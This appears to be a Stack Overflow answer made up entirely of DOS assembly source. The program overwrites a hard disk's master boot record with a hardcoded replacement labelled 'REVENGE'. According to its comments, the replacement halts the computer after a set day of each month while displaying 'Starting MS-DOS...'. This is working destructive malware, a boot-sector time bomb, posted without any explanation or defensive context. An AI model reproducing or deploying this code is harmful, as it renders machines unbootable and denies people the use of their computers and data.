---
title: "Answer 952929"
se.owner.user_id: 320715
se.owner.display_name: "Sawa Akisawa"
se.owner.link: "https://ru.stackoverflow.com/users/320715/sawa-akisawa"
se.answer_id: 952929
se.question_id: 934247
se.post_type: answer
se.score: 0
se.is_accepted: False
---
<pre><code>;******************************************************************
;*                                                                *
;*  Rewrite MBR: orig=&gt;revenge (halt after X day of month)        *
;*                                                                *
;*                                                                *
;******************************************************************
.model TINY
.CODE
.286

org 100h

start:
     pushf
     pusha
     push ds
     push es

     mov ax,cs
     mov ds,ax
     mov es,ax

     mov dx,80h;                      ; read original MBR
     mov cx,1;
     mov ax,0201h;
     mov bx, offset buff
     int 13h;

     mov di,offset buff               ; change program
     mov si,offset MBR
     cld
     mov cx,offset buff-offset MBR
     rep movsb

     inc cx;                          ; write MBR
     mov ax,0301h;
     int 13h;

     pop es
     pop ds
     popa
     popf

     mov ax,4c00h                     ; exit
     int 21h


; 10-12-95 08:33pm
; Version 1.0
; Master Boot Record: REVENGE
; after MDAY each month
; CodeLenght this programm must be less than 238 byte !
; byte [24h]=MDAY (18H)

MBR db 0FAh,02Bh,0C0h,08Eh,0D0h,08Eh,0C0h,08Eh,0D8h,0BCh,000h,07Ch,0FBh,08Bh,0F4h,0BFh
    db 000h,07Eh,0B9h,000h,001h,0FCh,0F3h,0A5h,0E9h,000h,002h,0B0h,007h,0E6h,070h,0EBh
    db 000h,0E4h,071h,03Ch, 018h, 07Fh,024h,0B9h,004h,000h,0BEh,0EEh,07Fh,0F6h,004h,080h
    db 074h,014h,0F6h,044h,004h,004h,074h,00Eh,08Bh,014h,08Bh,04Ch,002h,0E8h,013h,000h
    db 059h,0EAh,000h,07Ch,000h,000h,083h,0EEh,010h,0E2h,0E2h,0BEh,072h,07Eh,0E8h,017h
    db 000h,0EBh,0FEh,0BBh,000h,07Ch,0BDh,005h,000h,0B8h,001h,002h,0CDh,013h,073h,007h
    db 02Bh,0C0h,0CDh,013h,04Dh,075h,0F2h,0C3h,0B4h,00Eh,0ACh,0CDh,010h,00Ah,0C0h,075h
    db 0F9h,0C3h,053h,074h,061h,072h,074h,069h,06Eh,067h,020h,04Dh,053h,02Dh,044h,04Fh
    db 053h,02Eh,02Eh,02Eh,00Dh,00Ah,000

buff db 516 dup (?)

END start
</code></pre>
